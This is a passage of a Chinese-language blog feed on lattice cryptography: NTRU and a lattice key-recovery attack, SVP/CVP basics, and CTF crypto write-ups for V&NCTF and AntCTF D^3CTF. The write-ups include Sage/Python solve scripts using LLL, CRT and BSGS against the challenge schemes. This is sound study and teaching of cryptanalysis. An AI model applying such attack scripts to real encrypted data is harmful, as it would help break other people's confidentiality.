id="Encrypt"><a href="#Encrypt" class="headerlink" title="Encrypt"></a>Encrypt</h4><p>NTRU密码系统的加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message,publickey</span>):</span><br><span class="line">    r = randomdpoly()</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(publickey,r) + message,q)</span><br></pre></td></tr></table></figure><h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>NTRU密码系统的解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext,secretkey</span>):</span><br><span class="line">    f, f3 = secretkey</span><br><span class="line">    a = balancedmod(convolution(ciphertext,f),q)</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(a,f3),<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/Lattice_learning/5.png" alt="Coppersmith"></p><p>加密解密的原理比较简单，这里就不再赘述，但是要注意如果参数大于了正常的解密范围，极有可能引起解密失败，但可以通过标准化 $q,n,d$ 来解决， $q$ 的选取越小越好，因为多项式的系数可以为 <code>&#123;-1,0,1&#125;</code>这类</p><h4 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h4><p>这里的攻击方式显然并不是恢复 $publickey$ 中的 $f(x)$ ，<del>毕竟这也太靠脸了</del></p><p>由于NTRU的解密合法性，我们发现如果我们能找到一组 $f(x)$ 与 $g(x)$ 也满足 $key$ 的关系，那么我们就能拿这组多项式来充当新的 $key$</p><p>我们的矩阵构造如下<br>$$<br>B^{NTRU}<br>&#x3D;<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{h(x)} \\<br>\pmb{0}&amp;\pmb{q}<br>\end{bmatrix}}<br>&#x3D;<br>\begin{bmatrix}<br>\begin{array}{lllll|lllll}<br>1&amp;0&amp;0&amp;\cdots&amp;0&amp;h_0&amp;h_1&amp;h_2&amp;\cdots&amp;h_{n-1} \\<br>0&amp;1&amp;0&amp;\cdots&amp;0&amp;h_{n-1}&amp;h_0&amp;h_1&amp;\cdots&amp;h_{n-2} \\<br>0&amp;0&amp;1&amp;\cdots&amp;0&amp;h_{n-2}&amp;h_{n-1}&amp;h_0&amp;\cdots&amp;h_{n-3} \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;1&amp;h_1&amp;h_2&amp;h_3&amp;\cdots&amp;h_0 \\<br>\hline<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;q&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;q&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;q&amp;\cdots&amp;0 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;0&amp;\cdots&amp;q \\<br>\end{array}<br>\end{bmatrix}<br>$$<br>当然左上角也可以选任意的正整数 $\lambda$ ， 同余方程里 $f(x)$ 乘个系数 $\lambda$ 罢了，对 $B^{NTRU}$ 格基规约后得到的第一个向量就可以作为新的 $f’(x)$ 和 $g’(x)$ 了</p><p>据说可以添加一个大整数 $\theta$ ，这样方便规约，如下<br>$$<br>B^{NTRU}_{\theta}<br>&#x3D;<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{\theta h(x)} \\<br>\pmb{0}&amp;\pmb{q\theta}<br>\end{bmatrix}}<br>$$<br>不过现在遇到的题基本上都是给的多项式计算后的数，直接用多项式的好像很少（？，但原理层面上是差不多的，只不过关系好推一点，代码实现起来也简单点吧</p><h3 id="LWE-learning-with-error"><a href="#LWE-learning-with-error" class="headerlink" title="LWE (learning with error)"></a>LWE (learning with error)</h3><p>Waiting for undate……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lattice-learning-2&quot;&gt;&lt;a href=&quot;#Lattice-learning-2&quot; class=&quot;headerlink&quot; title=&quot;Lattice learning 2&quot;&gt;&lt;/a&gt;Lattice learning 2&lt;/h1&gt;&lt;blockquo</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Lattice learning 1</title>
    <link href="http://example.com/2021/03/17/Lattice_learning1/"/>
    <id>http://example.com/2021/03/17/Lattice_learning1/</id>
    <published>2021-03-17T11:55:40.000Z</published>
    <updated>2021-03-19T03:11:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lattice-learning-1"><a href="#Lattice-learning-1" class="headerlink" title="Lattice learning 1"></a>Lattice learning 1</h1><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>花了一下午的时间学完了线代<br>数学家们上辈子一定是天使吧，才能发明出这么美妙的东西<br>线性代数 相见恨晚</p><h2 id="Chapter-1-The-world-of-the-Lattice"><a href="#Chapter-1-The-world-of-the-Lattice" class="headerlink" title="Chapter 1 The world of the Lattice"></a>Chapter 1 The world of the Lattice</h2><p>向量真是个神奇的东西，因为世界上的一切都可以用向量来表示。那么如果我们要去表示一个线性空间 $V$ ，我们就需要至少两个非线性相关的向量作为基底，比方说 $\vec{i}$ 和 $\vec{j}$，因此任意的一个向量都可以用基底的线性组合来表示出来，比如 $\vec{x}&#x3D;a\cdot\vec{i}+b\cdot\vec{j}$ 。而能被 $\vec{i}$ 和 $\vec{j}$ 表示出来的所有向量的集合就称为这个线性空间 $V$ 。但是这里的’$a$’和’$b$’可以是任意的数字，那么如果我们假定这里的’$a$’和’$b$’都是整数（$a,b\in\mathbb{Z}$），这时我们就会得到一个整数格（Integer Lattice）。</p><p>我们首先使得所有的向量起点都位于原点，此时，所有的向量都与它们各自的终点一一对应，也就是说，我们可以使用向量的终点来代替该向量。那么此时我们的整数格 $V$ 就会变成一群离散开来并且有序排布的点集。当然，这些点的排列方式并不唯一，可以通过一些简单的线性变换来得到一个新的格空间。</p><p>举个栗子吧，比方说我们现在有 $\vec{b_1},\vec{b_2},\cdots,\vec{b_n}$ 作为基，那么格空间里所有的向量都可以被看作是一个矩阵 $A$：<br>$$<br>A&#x3D;\sum^n_{i&#x3D;1}(b_i\cdot \mathbb{Z})<br>$$<br>当然你也可以把这些基看成一个矩阵 $B$：<br>$$<br>A&#x3D;\sum^n_{i&#x3D;1}(b_i\cdot\mathbb{Z})&#x3D;B\cdot x(x\in\mathbb{Z}^n)<br>$$<br>所以说了这么多，格到底是什么东西？我们可以把它理解成一堆向量的集合，但是向量是很有意思的玩意。</p><h2 id="Chapher-2-Notions-in-Lattice"><a href="#Chapher-2-Notions-in-Lattice" class="headerlink" title="Chapher 2 Notions in Lattice"></a>Chapher 2 Notions in Lattice</h2><h3 id="行列式（Determinant）"><a href="#行列式（Determinant）" class="headerlink" title="行列式（Determinant）"></a>行列式（Determinant）</h3><p>一个矩阵的行列式可以看作是一种特殊的变换：它描述了由所有基向量组成的四边形或者多面体在这种线性变换中其面积或者体积的变化。</p><h3 id="最短距离（Shortest-distance）"><a href="#最短距离（Shortest-distance）" class="headerlink" title="最短距离（Shortest distance）"></a>最短距离（Shortest distance）</h3><p>比如一个由矩阵 $B$ 形成的格空间中，我们使用 $\lambda$ 来表示这个矩阵点集中的的最短距离，那么显然通过更换原点&#x2F;基的方法来把这个问题变成一个 $SVP$：<br>$$<br>\lambda_1&#x3D;min||x-y||\ \ \ (x,y\in B,x\not&#x3D;y) \\<br>&#x3D;min||x||\ \ \ (x\in B,x\not&#x3D;\vec{0})~~~~~~<br>$$<br>另外，我们用 $\lambda_2,\lambda_3,\cdots,\lambda_i,\cdots,\lambda_n$ 来表示第 $i$ 短的距离，那么显然以下结论成立：<br>$$<br>\lambda_1\leq\lambda_2\leq\lambda_3\leq\cdots\leq\lambda_n<br>$$</p><h2 id="Chapher-3-Problems-in-Lattice"><a href="#Chapher-3-Problems-in-Lattice" class="headerlink" title="Chapher 3 Problems in Lattice"></a>Chapher 3 Problems in Lattice</h2><h3 id="最短向量-SVP-Shortest-Vector-Problem"><a href="#最短向量-SVP-Shortest-Vector-Problem" class="headerlink" title="最短向量 SVP (Shortest Vector Problem)"></a>最短向量 SVP (Shortest Vector Problem)</h3><p>我们来考虑一个由矩阵 $B$ 构成的格空间 $L$ ，在其中去找这样的一个向量 $\vec{x}$ 满足：<br>$$<br>||B\vec{x}||&#x3D; \lambda_1\ \ \ (x\in \mathbb{Z}^k)<br>$$<br><img src="/img/Lattice_learning/1.png" alt="SVP"></p><p>好像看起来不难？但是当我们拿到一组较差的基时，此时的 $SVP$ 就很难求了，但是也有一种 $SVP$ 的简化版本 $SVP_\gamma$ 。在 $SVP_\gamma$ 中，我们只需要找到这样的向量 $\vec{x}$ 即可：<br>$$<br>||B\vec{x}||\leq \gamma\lambda_1\ \ \ (x\in \mathbb{Z}^k)<br>$$</p><h3 id="最近向量-CVP-Closest-Vector-Problem"><a href="#最近向量-CVP-Closest-Vector-Problem" class="headerlink" title="最近向量 CVP (Closest Vector Problem)"></a>最近向量 CVP (Closest Vector Problem)</h3><p>还是考虑一个由矩阵 $B$ 构成的格空间 $L$ ，给出一个点 $t$ ，在其中去找里点 $t$ 最近的一个向量 $\vec{x}$ ，也就是说：<br>$$<br>||B\vec{x}-\vec{t}||\leq\mu<br>$$</p><p><img src="/img/Lattice_learning/2.png" alt="CVP"></p><p>$CVP$ 也有它的简化版本 $CVP_\gamma$ ，其定义与 $SVP_\gamma$ 类似，即满足：<br>$$<br>||B\vec{x}-\vec{t}||\leq \gamma\mu\ \ \ (x\in \mathbb{Z}^k)<br>$$</p><p>$SVP$ 和 $CVP$ 都被证明是 np-hard 的问题 <del>说白了就是难的离谱</del></p><h2 id="Chapher-4-Geometric-structure-in-Lattice"><a href="#Chapher-4-Geometric-structure-in-Lattice" class="headerlink" title="Chapher 4 Geometric structure in Lattice"></a>Chapher 4 Geometric structure in Lattice</h2><h3 id="尝试解决CVP"><a href="#尝试解决CVP" class="headerlink" title="尝试解决CVP"></a>尝试解决CVP</h3><p>CVP真的压根无法下手吗？显然不是。比如在笛卡尔坐标系里，只需要简单的上下取整就能找到此时的 $CVP$ ， $SVP$ 此时显然也是很简单的问题。那么我们只要能够将格 $\Lambda$ 变成一个几乎是正交基的格 $L$ ，那么我们就能很容易的解决 $SVP$ 和 $CVP$ 。我们通常称这个过程为’Lattice Basis Reduction’，比如’Gram-Schmidt’就是其中之一的方法，但是此时我们通过简单上下取整的操作不一定得到的就是正确的答案，也只有当 $||\vec{t}-\vec{v}||\leq min\frac{||\vec{b_i}||}{2}$ 时我们得到的才是正确的结果，原因如下图：</p><p><img src="/img/Lattice_learning/3.png" alt="Gram-Schmidt"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lattice-learning-1&quot;&gt;&lt;a href=&quot;#Lattice-learning-1&quot; class=&quot;headerlink&quot; title=&quot;Lattice learning 1&quot;&gt;&lt;/a&gt;Lattice learning 1&lt;/h1&gt;&lt;h2 id=&quot;P</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Thanks for reward</title>
    <link href="http://example.com/2021/03/17/Thanks_for_reward/"/>
    <id>http://example.com/2021/03/17/Thanks_for_reward/</id>
    <published>2021-03-17T11:55:40.000Z</published>
    <updated>2021-03-17T14:50:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打赏鸣谢"><a href="#打赏鸣谢" class="headerlink" title="打赏鸣谢"></a>打赏鸣谢</h1><p>会有的吧会有的吧会有的吧会有的吧会有的吧（哭</p><table><thead><tr><th align="left">ID</th><th align="left">Time</th><th align="left">Money</th></tr></thead><tbody><tr><td align="left">幸福一生</td><td align="left">2021-03-06 00:07:55</td><td align="left">￥1</td></tr></tbody></table><p><img src="/img/wechat.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;打赏鸣谢&quot;&gt;&lt;a href=&quot;#打赏鸣谢&quot; class=&quot;headerlink&quot; title=&quot;打赏鸣谢&quot;&gt;&lt;/a&gt;打赏鸣谢&lt;/h1&gt;&lt;p&gt;会有的吧会有的吧会有的吧会有的吧会有的吧（哭&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;lef</summary>
      
    
    
    
    <category term="Text" scheme="http://example.com/categories/Text/"/>
    
    
    <category term="Thanks" scheme="http://example.com/tags/Thanks/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for V&amp;NCTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/14/Writeup_for_V&amp;NCTF2021&#39;s_crypto/"/>
    <id>http://example.com/2021/03/14/Writeup_for_V&amp;NCTF2021&#39;s_crypto/</id>
    <published>2021-03-14T14:17:49.000Z</published>
    <updated>2021-04-05T13:55:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-V-amp-NCTF-39-s-crypto"><a href="#Writeup-for-V-amp-NCTF-39-s-crypto" class="headerlink" title="Writeup for V&amp;NCTF&#39;s crypto"></a>Writeup for V&amp;NCTF&#39;s crypto</h1><h2 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h2><p>密码方向签到题，先分解n，详细推导过程如下：</p><p>$$<br>e\cdot d \equiv 1\pmod{lcm(p,p-1,q-1)}&#x3D;k\cdot \frac{p\times(p-1)\times(q-1)}{gcd}+1<br>$$</p><p>$$<br>m^{e\cdot d}&#x3D;m\pmod{((p-1)\times p)}\ 且\ m^{e\cdot d}&#x3D;m\pmod{(q-1)}<br>$$</p><p>$$<br>m^{ed}\equiv m\pmod{((p-1)\times(q-1)\times p)}<br>$$</p><p>$$<br>e\cdot d&#x3D;k\times p\times(p-1)\times(q-1)+1<br>$$</p><p>$$<br>(e\cdot d)^e&#x3D;\sum^{e}_{i&#x3D;0}C^i_e\cdot (k\times p\times (p-1)\times(q-1))^i\times 1^{e-i}&#x3D;K\times p +1<br>$$</p><p>所以<code>n</code>很容易被分解，从而算得前一步的<code>e</code>，此时发现<code>d</code>较小（满足如下关系）</p><p>$$<br>\frac{1}{3}N^{\frac{1}{4}}\leq d\leq N^{0.292}<br>$$</p><p>我们这里使用维纳攻击，但是因为<code>d</code>相对于连分数还是比较大的，需要理解原理稍微优化一下，得到一个<code>URL</code>，下载后得到另一个的脚本，最后一步较为简单，先在<code>sage</code>里用<code>small_roots</code>算出来<code>padding</code>，然后<code>related_message_attack</code>即可解决</p><h2 id="Strange-function-amp-Strange-function-revenge"><a href="#Strange-function-amp-Strange-function-revenge" class="headerlink" title="Strange_function &amp; Strange_function_revenge"></a>Strange_function &amp; Strange_function_revenge</h2><p>交互题，在<code>data</code>数组已知的情况下需要连续正确提交五次<code>token</code></p><p>服务器提供计算<code>f(x)</code>满足<br>$$<br>f(x)&#x3D;\sum^{len(token)}_{i&#x3D;1}\frac{ord(token_i)}{x-data_i}<br>$$</p><p>显然<code>ord(token[i])</code>不超过130，而<code>data</code>却是2^32左右的数字，我们简单计算下<br>$$<br>130\div 2^{32}\times16\times5\approx 0.000002421438694000244140625<br>$$<br>$$<br>130\div 2^{17}\times 8 \times5\approx 0.0396728515625<br>$$<br>所以当我们的<code>x</code>逼近其中的一个<code>data_i</code>时对<code>f(x)</code>的影响微乎其微，基本可以忽略，所以可以通过这一点来得到<code>token[i]</code>，思路如下：</p><p>我们发现：</p><p>$$<br>f(data_1+1)&#x3D;\sum^{len(token)}_{i&#x3D;1}\frac{ord(token_i)}{(data_1+1)-data_i}&#x3D;<br>$$</p><p>$$<br>ord(token_1)+\sum^{len(token)}_{i&#x3D;2}\frac{ord(token_i)}{x-data_i}\approx<br>$$</p><p>$$<br>ord(token_1)+\sum^{len(token)}_{i&#x3D;2}\frac{1}{\infty}&#x3D; ord(token_1)<br>$$</p><p>当然分子部分显然离无穷还是比较远的，那么我们要么想办法扩大<code>data</code>之间的距离，要么想办法抵消或者减小掉后面部分的影响，因为<code>data</code>和<code>token</code>均不可控，这里我们选择如下的方法来逼近<code>ord(token[i])</code><br>$$<br>k\times token(i)&#x3D;\bigg(\frac{f(data_i+1)+f(data_i-1)}{2}\bigg)+\bigg(f(data_i+2)+f(data_i-2)\bigg)+\cdots<br>$$<br>交互时间大概几分钟</p><blockquote><p>其实+1-1之后已经就消掉了，后面的只是为了更加确保</p></blockquote><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><p>给了两组特别的RSA公钥，特点是共用一个<code>d</code>，但<br>$$<br>d&#x3D;inv(e,(p+1)*(q+1))<br>$$<br>具体推导如下：</p><p>对于每一组公钥，我们有：<br>$$<br>e_i\cdot d&#x3D;k_i(N_i+s_i)+1<br>$$<br>我们也可以给他们进行重新排序，使之满足：<br>$$<br>N_1&lt;N_2&lt;2N_1<br>$$<br>这里我们的推导过程如下：<br>$$<br>令M&#x3D;\lfloor N_2^{\frac{1}{2}}\rfloor\ 有：<br>$$<br>$$<br>dM ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ &#x3D;dM ~~~~~~~~~~~<br>$$<br>$$<br>e_1d-N_1k_1 ~~~~~~~~~~~~~~~ &#x3D;1+k_1s_1 ~~<br>$$<br>$$<br>e_2d ~~~~~~~~~~~~~~~ -N_2k_2&#x3D;1+k_2s_2 ~~<br>$$</p><p>这样的三个方程组我们可以写成这样的向量矩阵方程<br>$$<br>XB&#x3D;V<br>$$<br>$$<br>X&#x3D;{\begin{bmatrix}<br>dM &amp; e1 &amp; e2<br>\end{bmatrix}}<br>$$<br>$$<br>B&#x3D;{\begin{bmatrix}<br>M &amp; e1 &amp; e2 \\<br> &amp; -N_1 &amp;  \\<br> &amp; &amp; -N_2<br>\end{bmatrix}}<br>$$<br>$$<br>V&#x3D;{\begin{bmatrix}<br>dM &amp; 1+k_1s_1 &amp; 1+k_2s_2<br>\end{bmatrix}}<br>$$<br>LLL格基规约后即可算出 <code>d</code>和每一个<code>not_phi</code>，接着就可以轻松分解<code>N</code>，RSA正常解密即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-V-amp-NCTF-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-V-amp-NCTF-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for V&amp;amp;NCTF&amp;#</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Write up for AntCTF X D^3CTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/08/Wp_for_AntCTF_X_D^3CTF&#39;s_crypto/"/>
    <id>http://example.com/2021/03/08/Wp_for_AntCTF_X_D^3CTF&#39;s_crypto/</id>
    <published>2021-03-08T14:53:03.000Z</published>
    <updated>2021-03-14T14:30:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-AntCTF-X-D-3CTF-39-s-crypto"><a href="#Wp-for-AntCTF-X-D-3CTF-39-s-crypto" class="headerlink" title="Wp for AntCTF X D^3CTF&#39;s crypto"></a>Wp for AntCTF X D^3CTF&#39;s crypto</h1><p>我的格子和椭圆曲线实在是太烂了，奈何这次比赛基本都是（</p><p>这次只贡献了1k分，我对不起V&amp;N的师傅们呜呜呜</p><span id="more"></span><h2 id="babyLattice"><a href="#babyLattice" class="headerlink" title="babyLattice"></a>babyLattice</h2><p>联合第二题，发现此题应该要分解n，观察秘钥生成代码，发现如下关系：</p><p>$$<br>a_1 &#x3D; k \cdot n + a_{11} \cdot q \cdot inv(q,p) + a_{21} \cdot p \cdot inv(p,q)<br>$$<br>$$<br>a_2 &#x3D; k \cdot n + a_{12} \cdot q \cdot inv(q,p) + a_{22} \cdot p \cdot inv(p,q)<br>$$</p><p>所以<br>$$<br>a_1 &#x3D; a_{11} \pmod{p} &#x3D; a_{21} \pmod{q}<br>$$<br>$$<br>a_2 &#x3D; a_{12} \pmod{p} &#x3D; a_{22} \pmod{q}<br>$$</p><p>所以易知<br>$$<br>b &#x3D;\frac{a_{11}}{a_{12}}\pmod{p}&#x3D;\frac{a_{21}}{a_{22}}\pmod{q}<br>$$</p><p>即</p><p>$$<br>b\cdot a_{12} - a_{11} &#x3D; 0 \pmod{p}<br>$$<br>$$<br>b\cdot a_{22} - a_{21} &#x3D; 0 \pmod{q}<br>$$</p><p>所以</p><p>$$<br>(b\cdot a_{12}-a_{11})(b\cdot a_{22}-a_{21})&#x3D;0 \pmod{n}<br>$$</p><p>即</p><p>$$<br>b^2\cdot a_{12}\cdot a_{22} - b\cdot (a_{12}\cdot a_{21}+a_{11}\cdot a_{22}) + (a_{11}\cdot a_{21}) &#x3D; 0 \pmod{n}<br>$$</p><p>我们选择构造格子<br>$$<br>{\begin{bmatrix}<br>1 &amp; 0 &amp; b^2 \\<br>0 &amp; 1 &amp; b \\<br>0 &amp; 0 &amp; n<br>\end{bmatrix}}<br>$$</p><p>LLL格基规约后再分解就能得到<code>a_12</code>、<code>a_22</code>、<code>a_12</code>和<code>a_22</code>，就可以恢复出<code>A</code>，关于中间的顺序，首先 $gcd(n,b\cdot a_{12}-a_{11})&#x3D;p，gcd(n,b\cdot a_{22} - a_{21})&#x3D;q$ ，然后反过头来用<code>b</code>检验，即可得到<code>A</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span><br><span class="line">b=65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196</span><br><span class="line">m = [[1,0,b**2],</span><br><span class="line">[0,1,b],</span><br><span class="line">[0,0,n]]</span><br><span class="line">M = Matrix(ZZ,m)</span><br><span class="line">print(M.LLL()</span><br></pre></td></tr></table></figure><p>私钥拿到之后跑一遍decrypt函数就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">def decrypt(c, sk):</span><br><span class="line">a2 = crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q])</span><br><span class="line">s1 = a2 * c % sk.p</span><br><span class="line">s2 = a2 * c % sk.q</span><br><span class="line">m, r = sk.A.solve_right(vector([s1, s2]))</span><br><span class="line">return m</span><br><span class="line">SecretKey = namedtuple(&#x27;SecretKey&#x27;, [&#x27;p&#x27;, &#x27;q&#x27;, &#x27;A&#x27;])</span><br><span class="line">n = 698045073281979616541286975103101096080462440304373626396370091849455338842947378705241865215097761899894513834380845079036601822125564663210580257883191930598948255707851053881237189214806988515510241088447820911174087537825999619430406958923237023619101073xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">b = 654739385780229208489849014846243612518694068218636169087772139065258584372361858322141986275106636324098693631439825949471641392200139046541969608293506424133487719184222204047775053450532021592003789353095938029168756814364427346672490495356709866737744870xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">c = 646663549384661940527205918107837690305665046534094651211733313626546652315738092349139857587250480713115715497774817768266247287420861746098971608971187502431927910215773481811303025721859117507974577939210694737300392259917557553409275067663952621259499393xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">a21 = 2078066511675xxxxxxxxxxxxxxxxx</span><br><span class="line">a11 = 1017199123798xxxxxxxxxxxxxxxxxx</span><br><span class="line">a12 = 1018979931854xxxxxxxxxxxxxxxxxx</span><br><span class="line">a22 = 1151291153120xxxxxxxxxxxxxxxxxx</span><br><span class="line">assert a21*a12+a11*a22 == 1382843159437215516163973075066558157591473xxxxxxxxxxxxxxxxxx</span><br><span class="line">p = gcd(n,(b*a12-a11)%n)</span><br><span class="line">q = gcd(n,(b*a22-a21)%n)</span><br><span class="line">print(p,q)</span><br><span class="line">assert p*q == n</span><br><span class="line">a1 = crt([a11, a21], [p, q])</span><br><span class="line">a2 = crt([a12, a22], [p, q])</span><br><span class="line">assert b == a1 * inverse_mod(a2, n) % n</span><br><span class="line">A = Matrix(ZZ, [[a11, a12], [a21, a22]])</span><br><span class="line">SK = SecretKey(p, q, A)</span><br><span class="line">m = decrypt(c, SK)</span><br><span class="line">flag = &#x27;d3ctf&#123;%s&#125;&#x27; % sha256(int(m).to_bytes(50, &#x27;big&#x27;)).hexdigest()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="simpleGroup"><a href="#simpleGroup" class="headerlink" title="simpleGroup"></a>simpleGroup</h2><p>发现给的n和babyLattice是一样的，直接把p和q抄过来，然后发现 $e\mid\varphi(n)$</p><p>每次加密有 $C &#x3D; y^m \cdot r^e % n$ ，则 $C^{(phi&#x2F;e)} &#x3D; {(y^m)}^{(phi&#x2F;e)} * r^phi &#x3D; {(y^m)}^{(phi&#x2F;e)} &#x3D; {(y^{(phi&#x2F;e)})}^m\pmod{n}$ </p><p>即 $C^{(phi&#x2F;e)} &#x3D; {(y^{(phi&#x2F;e)})}^m\pmod{n}$ ，因为 $m &#x3D; M \pmod{e}$ ，显然 $m&lt;e$ ，bsgs爆破得到<code>mlist</code>，返回去即可得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BSGS</span>(<span class="params">G,H,P</span>):</span><br><span class="line">    L1,L2 = [],[]</span><br><span class="line">    N = iroot(<span class="number">1928983487</span>,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N+<span class="number">1</span>):</span><br><span class="line">        L1.append(<span class="built_in">pow</span>(G,i,P))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N+<span class="number">1</span>):</span><br><span class="line">        tmp=H * inverse(<span class="built_in">pow</span>(G,i*N,P),P) % P</span><br><span class="line">        L2.append(tmp)</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">in</span> L1:</span><br><span class="line">            a=L1.index(tmp)</span><br><span class="line">            b=i</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b*N+a)</span><br><span class="line"></span><br><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910</span>1073xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">y = <span 